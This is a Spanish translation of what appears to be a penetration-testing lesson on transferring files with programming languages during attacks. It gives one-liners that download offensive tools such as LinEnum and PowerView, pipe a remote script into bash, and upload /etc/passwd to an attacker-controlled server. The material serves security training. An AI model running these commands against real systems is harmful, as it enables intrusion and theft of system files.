¡Entendido! Aquí tienes la traducción manteniendo los títulos en inglés:

Es común encontrar diferentes lenguajes de programación instalados en las máquinas que estamos atacando. Lenguajes de programación como Python, PHP, Perl y Ruby son comúnmente disponibles en distribuciones de Linux, pero también pueden estar instalados en Windows, aunque esto es mucho menos común.

Podemos usar algunas aplicaciones predeterminadas de Windows, como `cscript` y `mshta`, para ejecutar código JavaScript o VBScript. JavaScript también puede ejecutarse en hosts Linux.

Según Wikipedia, existen alrededor de [700 lenguajes de programación](https://en.wikipedia.org/wiki/List_of_programming_languages), y podemos crear código en cualquier lenguaje de programación para descargar, subir o ejecutar instrucciones en el sistema operativo. Esta sección proporcionará algunos ejemplos utilizando lenguajes de programación comunes.

---
## Python

Python es un lenguaje de programación popular. Actualmente, se admite la versión 3, pero podemos encontrar servidores donde todavía existe la versión 2.7 de Python. `Python` puede ejecutar one-liners desde una línea de comandos del sistema operativo usando la opción `-c`. Veamos algunos ejemplos:

### Python 2 - Download

```r
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

### Python 3 - Download

```r
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

---
## PHP

`PHP` también es muy prevalente y proporciona múltiples métodos de transferencia de archivos. [Según los datos de W3Techs](https://w3techs.com/technologies/details/pl-php), PHP es utilizado por el 77.4% de todos los sitios web con un lenguaje de programación del lado del servidor conocido. Aunque la información no es precisa, y el número puede ser ligeramente menor, a menudo encontraremos servicios web que utilizan PHP al realizar una operación ofensiva.

Veamos algunos ejemplos de cómo descargar archivos usando PHP.

En el siguiente ejemplo, utilizaremos el módulo PHP [file_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php) para descargar contenido de un sitio web combinado con el módulo [file_put_contents()](https://www.php.net/manual/en/function.file-put-contents.php) para guardar el archivo en un directorio. `PHP` se puede usar para ejecutar one-liners desde una línea de comandos del sistema operativo usando la opción `-r`.

### PHP Download with File_get_contents()

```r
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

Una alternativa a `file_get_contents()` y `file_put_contents()` es el módulo [fopen()](https://www.php.net/manual/en/function.fopen.php). Podemos usar este módulo para abrir una URL, leer su contenido y guardarlo en un archivo.

### PHP Download with Fopen()

```r
php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

---
También podemos enviar el contenido descargado a una pipe, similar al ejemplo sin archivos que ejecutamos en la sección anterior usando cURL y wget.

### PHP Download a File and Pipe it to Bash

```r
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**Nota:** La URL se puede usar como nombre de archivo con la función @file si se han habilitado los wrappers fopen.

---
## Other Languages

`Ruby` y `Perl` son otros lenguajes populares que también se pueden usar para transferir archivos. Estos dos lenguajes de programación también admiten la ejecución de one-liners desde una línea de comandos del sistema operativo usando la opción `-e`.

---
### Ruby - Download a File

```r
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

---
### Perl - Download a File

```r
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

---
## JavaScript

JavaScript es un lenguaje de scripting o programación que permite implementar características complejas en páginas web. Al igual que con otros lenguajes de programación, podemos usarlo para muchas cosas diferentes.

El siguiente código JavaScript está basado en [esta](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) publicación, y podemos descargar un archivo usándolo. Crearemos un archivo llamado `wget.js` y guardaremos el siguiente contenido:

```r
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Podemos usar el siguiente comando desde un símbolo del sistema de Windows o terminal de PowerShell para ejecutar nuestro código JavaScript y descargar un archivo.

### Download a File Using JavaScript and cscript.exe

```r
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

---
## VBScript

[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") es un lenguaje de scripting activo desarrollado por Microsoft que está modelado en Visual Basic. VBScript ha sido instalado por defecto en todas las versiones de escritorio de Microsoft Windows desde Windows 98.

El siguiente ejemplo de VBScript se puede usar basado en [esta](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs) publicación. Crearemos un archivo llamado `wget.vbs` y guardaremos el siguiente contenido:

```r
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Podemos usar el siguiente comando desde un símbolo del sistema de Windows o terminal de PowerShell para ejecutar nuestro código VBScript y descargar un archivo.

### Download a File Using VBScript and cscript.exe

```r
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

---
## Upload Operations using Python3

Si queremos subir un archivo, necesitamos entender las funciones en un lenguaje de programación particular para realizar la operación de carga. El módulo [requests de Python3](https://pypi.org/project/requests/) te permite enviar solicitudes HTTP (GET, POST, PUT, etc.) usando Python. Podemos usar el siguiente código si queremos subir un archivo a nuestro [uploadserver de Python3](https://github.com/Densaugeo/uploadserver).

### Starting the Python uploadserver Module

```r
python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Uploading a File Using a Python One-liner

```r
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Dividamos esta one-liner en múltiples líneas para entender mejor cada pieza.

```r
# Para usar la función requests, necesitamos importar el módulo primero.
import requests 

# Definir la URL de destino donde subiremos el archivo.
URL = "http://192.168.49.128:8000/upload"

# Definir el archivo que queremos leer, abrirlo y guardarlo en una variable.
file = open("/etc/passwd","rb")

# Usar una solicitud POST de requests para subir el archivo.
r = requests.post(url,files={"files":file})
```

Podemos hacer lo mismo con cualquier otro lenguaje de programación. Una buena práctica es elegir uno e intentar construir un programa de carga.

---
## Section Recap

Entender cómo podemos usar código para descargar y subir archivos puede ayudarnos a alcanzar nuestros objetivos durante un ejercicio de red teaming, una prueba de penetración, una competencia de CTF, un ejercicio de respuesta a incidentes, una investigación forense o incluso en nuestro trabajo diario de administración de sistemas.